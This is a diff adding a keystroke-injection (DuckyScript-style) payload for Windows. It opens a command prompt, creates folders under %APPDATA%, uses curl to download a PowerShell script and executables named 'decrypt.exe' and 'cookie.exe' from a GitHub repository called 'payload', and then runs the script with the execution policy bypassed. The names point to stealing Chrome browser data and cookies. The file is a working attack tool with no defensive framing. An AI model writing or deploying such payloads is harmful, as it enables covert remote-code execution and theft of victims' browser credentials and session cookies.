@@ -1,0 +1,37 @@
+
+CTRL ESC
+DELAY 1000
+STRING cmd
+DELAY 300
+ENTER
+DELAY 1000
+STRING mkdir %APPDATA%\BrowserData
+DELAY 200
+ENTER
+DELAY 200
+STRING mkdir %APPDATA%\BrowserData\Chrome
+DELAY 200
+ENTER
+DELAY 200
+STRING mkdir %APPDATA%\ZippedBrowserData
+DELAY 200
+ENTER
+DELAY 200
+
+STRING echo. > %APPDATA%\BrowserData\script.ps1
+DELAY 200
+ENTER
+DELAY 200
+REM Download PowerShell script from GitHub
+STRING curl --ssl-no-revoke -o "%APPDATA%\BrowserData\script.ps1" "https://raw.githubusercontent.com/AlpoProo/payload/refs/heads/main/script.ps1"
+ENTER
+DELAY 200
+STRING curl --ssl-no-revoke -o "%APPDATA%\BrowserData\Chrome\decrypt.exe" "https://raw.githubusercontent.com/AlpoProo/payload/refs/heads/main/decrypt.exe"
+ENTER
+DELAY 200
+STRING curl --ssl-no-revoke -o "%APPDATA%\BrowserData\Chrome\cookie.exe" "https://raw.githubusercontent.com/AlpoProo/payload/refs/heads/main/cookie.exe"
+ENTER
+DELAY 200
+REM Execute the PowerShell script
+STRING powershell -ExecutionPolicy Bypass -File "%APPDATA%\BrowserData\script.ps1"
+ENTER
